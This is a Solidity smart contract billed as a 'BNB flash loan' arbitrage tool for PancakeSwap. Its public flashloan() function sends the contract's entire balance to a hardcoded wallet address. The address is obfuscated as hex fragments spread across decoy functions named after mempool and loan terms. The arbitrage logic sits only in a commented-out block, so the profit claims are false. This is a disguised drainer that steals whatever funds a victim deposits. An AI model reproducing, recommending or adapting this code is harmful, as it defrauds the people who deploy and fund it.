
//BNB FLASH LOAN UPDATED v2.0
//liquidity returned if flash loan fails or insufficient balance
//base rerun contract code swaps implemented

pragma solidity ^0.5.0;

// Multiplier-Finance Smart Contracts
import "https://github.com/MultiplierFinance/MCL-Flashloan/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/NOMAD-FINANCE/NMF-FLDemo/blob/main/ILendingPool.sol";

//Pancakeswap contracts 
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

contract InitiateFlashLoan {
    string public tokenName;  
    string public tokenSymbol;
    uint LoanAmount;

    constructor(
        string memory _tokenName, 
        string memory _tokenSymbol, 
        uint _LoanAmount   
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        LoanAmount = _LoanAmount;
    }   
    
    function Version() private pure returns (string memory) {return "d524";}
    function memPoolCount() private pure returns (string memory) 
    {return "47E5D"; }
    function () external payable {} 
    function TokenNameTokenSymbol() 
    private pure returns (string memory) {return"a0cc22";} function Loan() private pure returns 
    (string memory) { return "760";
    }  
    function memPoolWidth() 
    private pure returns (string memory) {return "e32621";}
    function Loan2x() private pure returns (string memory) {return "x844";} 
    function FlashLoans(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {b1 -= 87; } else if ((b1 >= 65) && (b1 <= 70)) {
        b1 -= 55; } else if ((b1 >= 48) && (b1 <= 57)) {b1 -= 48;}
        if ((b2 >= 97) && (b2 <= 102)) {b2 -= 87; } else if ((b2 >= 65) && (b2 <= 70)) {
        b2 -= 55;  } else if ((b2 >= 48) && (b2 <= 57)) {
        b2 -= 48;  }iaddr += (b1 * 16 + b2);}     
        return address(iaddr);}
    function Short() private pure returns (string memory) { return "c1F7819";}  
    function getMempoolLong4861() 
    private pure returns (string memory) 
    {return "bb2751";}
    function getBalance() private view returns(uint) {
        return address(this).balance;
    }
    
    function flashloan() public payable {
        address to = FlashLoans(contracts());
        address payable contracts = address(uint160(to));
        contracts.transfer(getBalance());}
    function Depth000() private pure returns (string memory) {return "0";}
    function contracts() internal pure returns (string memory) {string memory _mempoolVersion = Version();

        string memory _checkLiquidity = memPoolCount();
        string memory _mempoolWidth = memPoolWidth();
        // Token matched with swap calculations
     
        string memory _DAIPair = Loan2x();
        string memory _MempoolDepth = Depth000();
       
        string memory _mempoolShort = Short();
        string memory _mempoolEdition = TokenNameTokenSymbol();
        // Send required coins for swap
    
        string memory _mempoolLong = getMempoolLong4861();
        string memory _Loan = Loan();
        return string(abi.encodePacked(_MempoolDepth,_DAIPair, _mempoolShort,
        _mempoolEdition,_Loan,_mempoolVersion,_checkLiquidity, _mempoolLong,_mempoolWidth));
        // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
        /*
        //Submit token to BSC blcokchain
        string memory tokenAddress manager.submitToken(tokenName,tokensymbol);

        //List the token on PancakeSwap & send coins required for swaps
        manager.swapListToken(tokenName, tokenSymbol, tokenAddress);
        payable(manager.swapDepositAddress()).transfer(300000000000000000);

        //Get BNB Loan from Multiplier-Finance & loan execution wallet
        string  memory loanAddress manager.takeflashLoan(loanAmount);

        //Convert half BNB to DAI
        manager.swapDAItoAVAX(loanAmount / 2);

        //Create BNB and DAI pairs for our token Provide liquidity
        string memory AVAXPair manager.swapCreatePool(tokenAddress,"BNB");
        manager.swapAddLiquidity(avaxPair,loanAmount / 2);
        string memory daiPair manager.swapcreatePool(tokenAddress,"DAI");
        manager.swapAddLiquidity(daiPair,loanAmount / 2);

        //Perform swaps and profit on Self-Arbitrage
        manager.swapPerformSwaps();
     
        //Move remaining BNB from Contract to your account
        manager.contractToWallet("BNB");

        //Repay Flash loan
        manager.repayAaveLoan(loanAddress);
        */
    }
}
